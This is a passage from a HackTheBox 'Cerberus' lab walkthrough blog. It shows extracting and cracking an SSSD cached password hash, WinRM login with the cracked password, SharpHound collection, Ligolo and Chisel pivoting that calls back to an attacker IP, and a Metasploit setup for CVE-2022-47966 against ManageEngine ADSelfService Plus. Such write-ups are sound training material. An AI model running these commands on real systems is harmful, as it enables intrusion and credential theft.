+<h3 id="Extracting-Cached-Credentials"><a href="#Extracting-Cached-Credentials" class="headerlink" title="Extracting Cached Credentials"></a>Extracting Cached Credentials</h3><p>Now with root access, we can examine <code>/var/lib/sss/db/cache_cerberus.local.ldb</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings cache_cerberus.local.ldb</span><br></pre></td></tr></table></figure>
+
+<p>This reveals a password hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Cracking"><a href="#Password-Cracking" class="headerlink" title="Password Cracking"></a>Password Cracking</h3><p>Using Hashcat to crack the hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>Result:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0:147258369</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Active-Directory-Access"><a href="#Active-Directory-Access" class="headerlink" title="Active Directory Access"></a>Active Directory Access</h2><h3 id="WinRM-Authentication"><a href="#WinRM-Authentication" class="headerlink" title="WinRM Authentication"></a>WinRM Authentication</h3><p><strong>Note:</strong> If you have connection issues, clean up your routes keeping only the necessary tunnel and tun0 interface.</p>
+<p>Connect to the Domain Controller via WinRM:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 172.16.22.1 -u &#x27;matthew&#x27; -p &#x27;147258369&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BloodHound-Enumeration"><a href="#BloodHound-Enumeration" class="headerlink" title="BloodHound Enumeration"></a>BloodHound Enumeration</h3><p>Download SharpHound to the target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.68:9095/SharpHound.exe -o SharpHound.exe</span><br></pre></td></tr></table></figure>
+
+<p>Execute the collector:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./SharpHound.exe -c All</span><br></pre></td></tr></table></figure>
+
+<p>Download the results:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\matthew&gt; download 20251027121113_BloodHound.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Cerberus/bloodhound.png" alt="BloodHound Analysis"></p>
+<p>The BloodHound analysis doesn’t reveal any obvious privilege escalation paths for Matthew’s account. Let’s continue enumeration.</p>
+<hr>
+<h2 id="Extended-Network-Enumeration"><a href="#Extended-Network-Enumeration" class="headerlink" title="Extended Network Enumeration"></a>Extended Network Enumeration</h2><h3 id="Deploying-Ligolo-on-the-Domain-Controller"><a href="#Deploying-Ligolo-on-the-Domain-Controller" class="headerlink" title="Deploying Ligolo on the Domain Controller"></a>Deploying Ligolo on the Domain Controller</h3><p>To achieve complete network visibility, we deploy Ligolo from the Domain Controller:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload agent.exe</span><br></pre></td></tr></table></figure>
+
+<p>After running a comprehensive port scan, we discover port 8888:</p>
+<p>Upon connecting to port 8888, we’re redirected to:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dc.cerberus.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Cerberus/adfs.png" alt="ADSelfService Plus Login"></p>
+<p>This reveals ManageEngine ADSelfService Plus is running on the Domain Controller.</p>
+<hr>
+<h2 id="Exploiting-ManageEngine-ADSelfService-Plus"><a href="#Exploiting-ManageEngine-ADSelfService-Plus" class="headerlink" title="Exploiting ManageEngine ADSelfService Plus"></a>Exploiting ManageEngine ADSelfService Plus</h2><h3 id="CVE-2022-47966"><a href="#CVE-2022-47966" class="headerlink" title="CVE-2022-47966"></a>CVE-2022-47966</h3><p>Research for “ADSelfService Plus exploit” leads us to this Metasploit pull request:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rapid7/metasploit-framework/pull/17556</span><br></pre></td></tr></table></figure>
+
+<p>This exploit was merged on February 7, 2023, shortly before Cerberus’ release on March 18, 2023.</p>
+<h3 id="Metasploit-Configuration"><a href="#Metasploit-Configuration" class="headerlink" title="Metasploit Configuration"></a>Metasploit Configuration</h3><p>Load the exploit module:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966</span><br><span class="line">set rhosts (DEPENDS ON HOW YOU HAVE DONE YOUR PROXY)</span><br><span class="line">set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f</span><br><span class="line">set ISSUER_URL http://dc.cerberus.local/adfs/services/trust</span><br></pre></td></tr></table></figure>
+
+<h3 id="Proxy-Configuration"><a href="#Proxy-Configuration" class="headerlink" title="Proxy Configuration"></a>Proxy Configuration</h3><p>If using SOCKS proxy with Chisel:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel.exe client 10.10.14.68:8000 R:socks</span><br></pre></td></tr></table></figure>
+
+<p>Add to Metasploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set proxies socks5:127.0.0.1:1080</span><br></pre></td></tr></table></figure>
+
+<p><strong>Note:</strong> The GUID can be obtained by logging into ADFS with Matthew’s credentials.</p>
+<h3 id="Exploitation-Tips"><a href="#Exploitation-Tips" class="headerlink" title="Exploitation Tips"></a>Exploitation Tips</h3><p>Getting the Metasploit module to work can be challenging due to network tunneling complexity. Consider trying different tunnel combinations:</p>
+<ul>
+<li>Ligolo + Chisel</li>
+<li>Chisel + Chisel</li>
+<li>Multiple Ligolo instances</li>
+</ul>
+<p>Persistence and experimentation with various tunneling configurations is key to success.</p>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cerberus-HackTheBox-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Cerberus - HackTheBox Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.2.1.</span> <span class="toc-text">Port Scanning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-Service-Discovery"><span class="toc-number">1.2.2.</span> <span class="toc-text">UDP Service Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Icinga-Web-2"><span class="toc-number">1.3.</span> <span class="toc-text">Exploiting Icinga Web 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-File-Inclusion-LFI"><span class="toc-number">1.3.1.</span> <span class="toc-text">Local File Inclusion (LFI)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Configuration-Files"><span class="toc-number">1.3.2.</span> <span class="toc-text">Extracting Configuration Files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Successful-Authentication"><span class="toc-number">1.3.3.</span> <span class="toc-text">Successful Authentication</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-Code-Execution"><span class="toc-number">1.4.</span> <span class="toc-text">Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Enumeration"><span class="toc-number">1.4.1.</span> <span class="toc-text">DNS Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-CVE-2021-32747"><span class="toc-number">1.4.2.</span> <span class="toc-text">Exploiting CVE-2021-32747</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Pivoting-with-Ligolo-ng"><span class="toc-number">1.5.</span> <span class="toc-text">Network Pivoting with Ligolo-ng</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-the-HTTP-Server"><span class="toc-number">1.5.1.</span> <span class="toc-text">Setting Up the HTTP Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Downloading-the-Agent"><span class="toc-number">1.5.2.</span> <span class="toc-text">Downloading the Agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ligolo-ng-Configuration"><span class="toc-number">1.5.3.</span> <span class="toc-text">Ligolo-ng Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Establishing-the-Tunnel"><span class="toc-number">1.5.4.</span> <span class="toc-text">Establishing the Tunnel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Internal-Network-Enumeration"><span class="toc-number">1.6.</span> <span class="toc-text">Internal Network Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Scanning-the-Domain-Controller"><span class="toc-number">1.6.1.</span> <span class="toc-text">Scanning the Domain Controller</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-on-Linux"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege Escalation on Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Understanding-SSSD"><span class="toc-number">1.7.1.</span> <span class="toc-text">Understanding SSSD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Container-Escape-via-Firejail"><span class="toc-number">1.7.2.</span> <span class="toc-text">Container Escape via Firejail</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Cached-Credentials"><span class="toc-number">1.7.3.</span> <span class="toc-text">Extracting Cached Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Cracking"><span class="toc-number">1.7.4.</span> <span class="toc-text">Password Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Access"><span class="toc-number">1.8.</span> <span class="toc-text">Active Directory Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM-Authentication"><span class="toc-number">1.8.1.</span> <span class="toc-text">WinRM Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.8.2.</span> <span class="toc-text">BloodHound Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extended-Network-Enumeration"><span class="toc-number">1.9.</span> <span class="toc-text">Extended Network Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploying-Ligolo-on-the-Domain-Controller"><span class="toc-number">1.9.1.</span> <span class="toc-text">Deploying Ligolo on the Domain Controller</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-ManageEngine-ADSelfService-Plus"><span class="toc-number">1.10.</span> <span class="toc-text">Exploiting ManageEngine ADSelfService Plus</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-47966"><span class="toc-number">1.10.1.</span> <span class="toc-text">CVE-2022-47966</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-Configuration"><span class="toc-number">1.10.2.</span> <span class="toc-text">Metasploit Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proxy-Configuration"><span class="toc-number">1.10.3.</span> <span class="toc-text">Proxy Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation-Tips"><span class="toc-number">1.10.4.</span> <span class="toc-text">Exploitation Tips</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&text=HTB-Cerberus"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&is_video=false&description=HTB-Cerberus"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Cerberus&body=Check out this article: https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&name=HTB-Cerberus&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&t=HTB-Cerberus"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
